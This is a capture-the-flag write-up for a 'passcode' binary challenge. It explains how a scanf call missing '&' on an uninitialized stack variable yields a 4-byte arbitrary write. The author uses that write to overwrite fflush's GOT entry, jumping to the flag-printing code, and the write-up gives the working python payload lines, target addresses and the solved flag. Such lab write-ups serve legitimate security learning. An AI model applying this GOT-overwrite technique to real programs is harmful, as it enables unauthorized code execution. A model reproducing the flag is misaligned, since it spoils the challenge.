# Description
```
Mommy told me to make a passcode based login system.
My first trial C implementation compiled without any error!
Well, there were some compiler warnings, but who cares about that?
```
---
##### Compiler Warnings
```
./passcode.c:10:13: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
   10 |     scanf("%d", passcode1);
      |            ~^   ~~~~~~~~~
      |             |   |
      |             |   int
      |             int *
./passcode.c:15:13: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
   15 |     scanf("%d", passcode2);
      |            ~^   ~~~~~~~~~
      |             |   |
      |             |   int
      |             int *
```

Snippet:
```C
void login(){  
    int passcode1;  
    int passcode2;  
  
    printf("enter passcode1 : ");  
    scanf("%d", passcode1);  
    fflush(stdin);  
  
    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)  
    printf("enter passcode2 : ");  
    scanf("%d", &passcode2);  
  
    printf("checking...\n");  
    if(passcode1==123456 && passcode2==13371337){  
        printf("Login OK!\n");  
        setregid(getegid(), getegid());  
        system("/bin/cat flag");  
    }  
    else{  
        printf("Login Failed!\n");  
        exit(0);  
    }  
}
```

Based on the `login` function, `scanf` treats `passcode1` and `passcode2`  as `int *`, which is not what we want.
- we have 100 character to put on the stack before jumping to `login`
- `passcode` variables are (un)initialized with stack values that we control
- `scanf` treats `passcode`'s as `int *`
	- ~~can't simply enter numbers~~ - but that means that we can enter value to the address which is initially in `passcode`'s, we can write to that address.
		- problems
			- figure out how `passcode`'s unallocated value is pulled from the stack
			- make it consistent (ASLR?)

Trying to input the `123456` (`0x1e240`) to see if the payload reaches the `passcode1` variable in the stack:
```
python2 -c "print '\x40\xe2\x01' * 33" > payload
gdb ~/passcode 
gdbb >>> r < payload
```
`passcode1` actually held that value, but the payload didn't reach`passcode2`.
This is essentially arbitrary write of 4 bytes to any address - 

Because we can't write 8 bytes (length of both `passcode`'s combined), we need to look for another direction.

As the binary is dynamically linked, perhaps we can overwrite the address of the next function call - `fflush` in the global offset table to jump directly to `setregid`.
([Resource](https://ir0nstone.gitbook.io/notes/binexp/stack/got-overwrite/exploiting-a-got-overwrite))

Using `readelf -a` I found the offset of `fflush`, and later looked at it on IDA:
![[./attachments/passcode-1.png]]
```
0804c014
```


Looking after the `cmp`, we see that the address we want to jump to is: 
```
0804929E (= 134517406 decimal)
```
![[./attachments/passcode-2.png]]
So we need to create a payload which we can enter through `gdb` (`r < payload`):
```python
python -c "print '\x01' * 96 + '\x14\xc0\x04\x08' + '\n' + '134517406'" > payload
```

Jumping into `login`, we see here the value of `passcode1` after `gdb` inputted both `name` and the address of our intended jump to `<login + 168>`
![[./attachments/passcode-3.png]]
Couldn't make it work inside GDB for some reason, but piping it directly worked:
```bash
python -c "print '\x01' * 96 + '\x14\xc0\x04\x08' + '\n' + '134517406'" > payload | ./passcode
```
# Flag
```
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
```